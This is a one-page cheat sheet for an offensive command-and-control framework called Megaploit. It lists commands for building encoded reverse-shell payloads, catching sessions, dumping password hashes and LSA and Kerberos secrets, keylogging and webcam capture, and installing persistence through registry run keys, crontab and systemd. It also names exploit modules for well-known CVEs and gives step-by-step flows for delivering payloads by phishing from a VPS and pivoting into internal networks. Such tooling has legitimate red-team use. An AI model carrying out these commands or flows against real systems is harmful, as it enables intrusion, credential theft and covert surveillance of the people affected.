# Megaploit Cheat Sheet

> One-page quick reference for all major commands. Print this out and keep it next to your keyboard.

---

## Server Startup

```bash
python3 -m megaploit                              # defaults (0.0.0.0:4444)
python3 -m megaploit --port 8080                  # custom port
python3 -m megaploit --host 10.0.0.1 --port 9999  # custom host + port
python3 -m megaploit --port 443 --ssl             # HTTPS transport
python3 -m megaploit --debug                      # verbose / debug mode
```

---

## Global Commands  *(at `megaploit >` prompt)*

### Sessions

| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List all active sessions | `sessions` |
| `interact <id>` | Enter a session | `interact session-1` |
| `kill <id>` | Kill a session | `kill session-1` |
| `rename <id> <name>` | Give a session a name | `rename session-1 webserver` |
| `broadcast <cmd>` | Run command on ALL sessions | `broadcast sysinfo` |
| `background_all` | Background all sessions | `background_all` |

### Payload Generation

| Command | Description | Example |
|---------|-------------|---------|
| `generate` | Interactive payload builder | `generate` |
| `generate --format exe --lhost 10.0.0.1 --lport 4444 -o shell.exe` | One-liner generate | — |

**Formats:** `exe` `exe32` `elf` `elf32` `elf_arm64` `py` `ps1` `bat` `sh` `hta` `jar` `apk` `msi` `dll`

**Encoders:** `xor_b64` `aes256` `rc4` `b64` `zlib_b64` `rot13_b64` `xor_hex` `aes_cbc` `chacha20` `reverse_b64` `triple_b64` `custom_key_xor`

**Stack encoders:** `xor_b64,aes256,b64`

### Modules

| Command | Description | Example |
|---------|-------------|---------|
| `use <module>` | Load a module | `use post/suggest_exploit` |
| `show options` | Show module options | `show options` |
| `set <OPT> <val>` | Set option | `set SESSION session-1` |
| `run` / `exploit` | Execute module | `run` |
| `search <term>` | Search modules | `search scanner` |
| `info <module>` | Module details | `info post/hashdump` |
| `back` | Unload module | `back` |

### Database

| Command | Description | Example |
|---------|-------------|---------|
| `db_status` | Check DB connection | `db_status` |
| `db_hosts` | List discovered hosts | `db_hosts` |
| `db_creds` | List captured credentials | `db_creds` |
| `db_sessions` | List past sessions | `db_sessions` |
| `db_export <file>` | Export DB to JSON | `db_export report.json` |
| `db_clear` | Wipe the database | `db_clear` |

### Networking / Pivoting

| Command | Description | Example |
|---------|-------------|---------|
| `route add <net> <session>` | Add pivot route | `route add 10.10.10.0/24 session-1` |
| `route list` | Show routes | `route list` |
| `route remove <net>` | Remove route | `route remove 10.10.10.0/24` |
| `portfwd add -l <lp> -r <rhost> -p <rp> -s <sid>` | Port forward | `portfwd add -l 8080 -r 10.10.10.5 -p 80 -s session-1` |
| `portfwd list` | List forwards | `portfwd list` |
| `portfwd remove <id>` | Remove forward | `portfwd remove 0` |

### Server Control

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Show all commands | `help` |
| `help <cmd>` | Help for a command | `help generate` |
| `set <opt> <val>` | Set global option | `set SessionKeepAlive 60` |
| `resource <file>` | Run script file | `resource setup.rc` |
| `exit` / `quit` | Exit Megaploit | `exit` |

---

## Session Commands  *(at `[session-N] >` prompt)*

### Recon / Info

```bash
whoami                    # current user
sysinfo                   # full system info
getuid                    # user + SID
getpid                    # process ID of agent
ps                        # list all processes
netstat                   # active connections
arp                       # ARP table (neighbour hosts)
route                     # routing table
env                       # environment variables
```

### Filesystem

```bash
pwd                       # print working directory
ls                        # list directory
ls /etc                   # list specific path
cd /tmp                   # change directory
cat /etc/passwd           # read a file
find / -name "*.conf"     # search for files
mkdir /tmp/tools          # make directory
rm /tmp/file.txt          # delete file
cp /etc/shadow /tmp/s     # copy file
mv /tmp/s /tmp/shadow     # move/rename file
```

### File Transfer

```bash
download /etc/shadow                          # download to your machine
download /etc/shadow /root/loot/shadow        # download to specific local path
upload /root/tools/linpeas.sh /tmp/lp.sh      # upload from your machine
upload /root/tools/mimikatz.exe C:\Temp\m.exe # upload to Windows target
```

### Command Execution

```bash
shell whoami                          # run OS command (Windows cmd)
shell ipconfig /all                   # Windows network info
shell net user                        # list Windows users
shell net localgroup administrators   # list local admins
powershell Get-Process                # run PowerShell command
powershell Get-NetIPAddress           # PS network info
execute -f /tmp/script.sh            # execute a file on target
```

### Privilege Escalation

```bash
getprivs                  # show current privileges
getsystem                 # attempt auto privesc (Windows)
migrate <PID>             # migrate agent into another process
steal_token <PID>         # steal token from process (Windows)
impersonate_token "NT AUTHORITY\SYSTEM"  # impersonate a token
```

### Windows Credential Harvesting

```bash
hashdump                  # dump local SAM hashes (requires SYSTEM)
lsa_dump                  # dump LSA secrets
kerberos_dump             # dump Kerberos tickets
wifi_passwords            # dump saved WiFi passwords
```

### Keylogging

```bash
keyscan_start             # start keylogger
keyscan_dump              # dump captured keystrokes
keyscan_stop              # stop keylogger
```

### Screenshots & Video

```bash
screenshot                # take a screenshot
webcam_list               # list webcams
webcam_snap               # capture webcam photo
screen_stream             # start live screen stream (if supported)
```

### Persistence

```bash
# Windows registry run key
shell reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d "C:\Temp\payload.exe" /f

# Linux crontab
shell echo "@reboot /tmp/agent" | crontab -

# Linux systemd service
shell echo "[Unit]\nDescription=Updater\n[Service]\nExecStart=/tmp/agent\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/updater.service
shell systemctl enable updater
```

### Pivoting from inside a session

```bash
socks_start 1080                # start SOCKS5 proxy on your machine via this session
socks_stop                      # stop SOCKS5 proxy
portfwd add -l 8080 -r 10.10.10.5 -p 80  # port forward through this session
```

### Session Management

```bash
background                # background session, return to megaploit >
exit                      # terminate (kill) this session
log save /root/session.log  # save session log
```

---

## Module Quick Reference

### Post-Exploitation Modules

```
post/suggest_exploit      # local exploit suggester
post/hashdump             # dump password hashes
post/lsa_dump             # dump LSA secrets
post/getsystem            # privilege escalation
post/bypassuac            # UAC bypass (Windows)
post/persist              # persistence installer
post/migrate              # process migration
post/enum_domain          # Active Directory enumeration
post/enum_shares          # enumerate network shares
post/enum_services        # enumerate running services
```

### Scanner Modules

```
scanner/port_scan         # TCP port scan
scanner/service_scan      # service/version detection
scanner/smb_scan          # SMB host discovery
scanner/ssh_scan          # SSH host discovery
scanner/http_scan         # HTTP/HTTPS scan
scanner/vuln_scan         # vulnerability scan
```

### Exploit Modules

```
exploit/eternalblue       # MS17-010 (SMB) — Windows 7/2008
exploit/ms08_067          # MS08-067 (NetAPI) — Windows XP/2003
exploit/bluekeep          # CVE-2019-0708 — Windows RDP
exploit/log4shell         # CVE-2021-44228 — Log4j RCE
exploit/zerologon         # CVE-2020-1472 — Netlogon privesc
exploit/printnightmare    # CVE-2021-34527 — Windows Print Spooler
exploit/proxylogon        # CVE-2021-26855 — Exchange RCE
exploit/shellshock        # CVE-2014-6271 — Bash/CGI RCE
exploit/heartbleed        # CVE-2014-0160 — OpenSSL info leak
exploit/psexec            # PsExec-style lateral movement
exploit/wmi_exec          # WMI lateral movement
exploit/ssh_brute         # SSH credential brute force
```

---

## Common Engagement Flows

### Local Lab — Windows target

```bash
# 1. Start listener
python3 -m megaploit --port 4444

# 2. Build payload
megaploit > generate      # format=exe, LHOST=192.168.1.50, LPORT=4444

# 3. Serve it
# (new terminal) python3 -m http.server 8000

# 4. On Windows target: download & run payload.exe

# 5. Catch shell
megaploit > sessions
megaploit > interact session-1

# 6. Escalate
[session-1] > getsystem
[session-1] > hashdump
```

---

### Internet-Facing Engagement (VPS)

```bash
# On VPS (203.0.113.10)
python3 -m megaploit --port 443 --ssl

# Generate HTTPS payload
megaploit > generate     # format=exe, LHOST=203.0.113.10, LPORT=443, ssl=yes

# Deliver via phishing email / website
# Session arrives → interact as normal
```

---

### Pivoting to Internal Network

```bash
# Got a session on DMZ host (192.168.1.100)
# Internal network is 10.10.10.0/24

# Add pivot route
megaploit > route add 10.10.10.0/24 session-1

# Start SOCKS proxy
[session-1] > socks_start 1080

# Configure proxychains
# /etc/proxychains4.conf → socks5 127.0.0.1 1080

# Now reach internal hosts
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.5 -u admin -p 'Password1'
```

---

### Automation with Resource Script

```bash
# File: setup.rc
sessions
interact session-1
sysinfo
screenshot
hashdump
background

# Run it
megaploit > resource setup.rc
```

---

## Keyboard Shortcuts

| Key | Action |
|-----|--------|
| `Tab` | Auto-complete command or path |
| `↑` / `↓` | Command history |
| `Ctrl+C` | Cancel current command |
| `Ctrl+Z` | Background current session |
| `Ctrl+D` | Exit / quit |

---

## Environment Variables / Global Options

```
set LHOST 192.168.1.50       # default LHOST for payload generation
set LPORT 4444               # default LPORT
set SessionKeepAlive 30      # keep-alive interval (seconds)
set AutoRunScript post/sysinfo  # auto-run module on new session
set Payload exe              # default payload format
set Encoder xor_b64          # default encoder
```

---

*See full documentation in the [`docs/`](.) directory.*
